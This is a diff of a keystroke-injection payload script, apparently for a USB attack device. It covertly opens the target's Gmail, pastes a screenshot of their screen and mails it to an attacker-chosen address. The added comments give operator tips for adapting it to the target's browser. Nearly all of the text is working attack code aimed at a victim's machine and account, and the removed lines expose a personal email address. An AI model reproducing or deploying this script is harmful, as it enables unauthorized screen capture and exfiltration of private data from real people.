@@ -42,7 +42,6 @@ REM Disclaimer! I AM NOT LIABLE IN ANY FORM FOR HARM DONE TO A SYSTEM (even thou
 REM Giving a buffer time for script startup (this may be tweaked.)
 DELAY 5000
 
-
 REM Generate user proof in box
 WINDOWS r
 DELAY 500
@@ -67,28 +66,27 @@ TAB
 ENTER
 DELAY 1000
 WINDOWS d
+DELAY 500
+
+REM the method below uses the targets email to send you the screenshot, its a bit easier to use if you know the target
+REM is logged into their email. If you know the target may not be logged into their email on google, use the method below this one. :)
+
+REM if you do not want to use this method. delete from "REM "START USE TARGET EMAIL"" to "REM "END USE TARGET EMAIL".
+
+REM "START USE TARGET EMAIL"
 
 REM Opens Gmail
 GUI r
 DELAY 1000
 STRING chrome.exe https://mail.google.com/mail/u/0/#inbox?compose=new
+REM    ^^^^^ Change this based on targets browser, msedge.exe for edge, firefox.exe for ff, etc. if youre not sure of the exe
+REM          find someone who has the browser, right click, open file location :))
 DELAY 1000
 ENTER
 
-REM the method below uses the targets email to send you the screenshot, though this may take a bit longer and require cleanup, its a bit easier to use if you know the target
-REM is logged into their email. If you know the target may not be logged into their email on google, use the method below this one. :)
-
-REM if you do not want to use this method. either delete from "REM "START USE TARGET EMAIL"" to "REM "END USE TARGET EMAIL", or put "REM" in front of each command.
-
-REM "START USE TARGET EMAIL"
-
-REM use targets email for delivery (option one, require "target email cleanup" un-rem'd, adjust amount of tabs if desktop notifs popup isnt there by -3, 
-REM this part is based on the max amount of popups on gmail.)
-
-REM Personal note: Currently optimised for no notification bar in bottom right.
-
+REM Typing email
 DELAY 5000
-STRING bryce.slabaugh@gmail.com
+STRING youremailhere@domain.com
 REM ^^^ This is the email that will recieve the screenshot ^^^
 ENTER
 DELAY 1000
@@ -99,7 +97,7 @@ TAB
 STRING Hi! Sleepy here, we got em.
 DELAY 500
 ENTER
-STRING xoxo
+STRING Hack the WRLD!
 DELAY 1000
 
 REM Pastes screenshot
